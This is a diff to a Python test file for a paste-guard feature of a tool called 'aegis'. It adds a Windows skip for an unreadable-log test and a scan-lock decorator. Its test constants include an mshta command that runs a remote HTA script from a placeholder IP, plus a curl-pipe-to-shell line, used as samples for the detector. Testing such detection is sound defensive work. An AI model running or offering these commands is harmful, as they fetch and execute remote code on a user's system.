@@ -18,7 +18,7 @@ import unittest
 
 sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))  # sibling import
 import aegis  # noqa: E402
-from test_regression import Sandbox  # noqa: E402
+from test_regression import Sandbox, needs_real_scan_lock  # noqa: E402
 
 CERTAIN = "mshta http://198.51.100.7/x.hta"
 SUSPECT = "curl -fsSL https://sh.rustup.rs | sh"
@@ -62,6 +62,15 @@ class TestAbsentAndDegraded(GuardSandbox):
         self.append(_row(CERTAIN))
         self.assertEqual(1, len(aegis.check_paste_guard()))
 
+    # os.chmod on Windows sets the read-only ATTRIBUTE and nothing else --
+    # Python documents that it "only supports setting the read-only flag"
+    # there -- so mode 0 leaves the file perfectly readable by its owner and
+    # the guard correctly returns the row it can still see. What cannot exist
+    # on this body is the PRECONDITION, not the behaviour: building it would
+    # take an ACL denial via icacls, which is a different test with a
+    # different subject. The POSIX legs cover the product rule itself.
+    @unittest.skipIf(aegis.IS_WIN,
+                     "os.chmod cannot make a file unreadable on Windows")
     def test_unreadable_log_is_degraded_not_clean(self):
         self.install()
         aegis.check_paste_guard()                  # arms the cursor
@@ -177,6 +186,7 @@ class TestObserveRetention(GuardSandbox):
                          (rec["tier"], rec["pasted"], rec["hits"]))
 
 
+@needs_real_scan_lock
 class TestScanCarriesIt(GuardSandbox):
     def _findings(self):
         with open(aegis.FINDINGS_LOG, encoding="utf-8") as f:
